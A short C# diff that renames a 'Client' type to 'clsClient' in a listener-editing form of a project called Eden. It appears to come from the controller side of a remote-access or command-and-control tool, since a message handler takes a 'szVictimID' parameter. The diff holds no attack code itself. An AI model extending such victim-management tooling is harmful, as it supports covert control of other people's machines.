@@ -12,7 +12,7 @@ namespace Eden
 {
     public partial class frmListenerEdit : Form
     {
-        public Client m_clnt;
+        public clsClient m_clnt;
         public Func<string, int, bool> m_atCheckExists;
 
         public bool m_bEdit = false;
@@ -29,7 +29,7 @@ namespace Eden
             InitializeComponent();
         }
 
-        void Received(Client clnt, string szVictimID, string[] aMsg)
+        void Received(clsClient clnt, string szVictimID, string[] aMsg)
         {
             try
             {
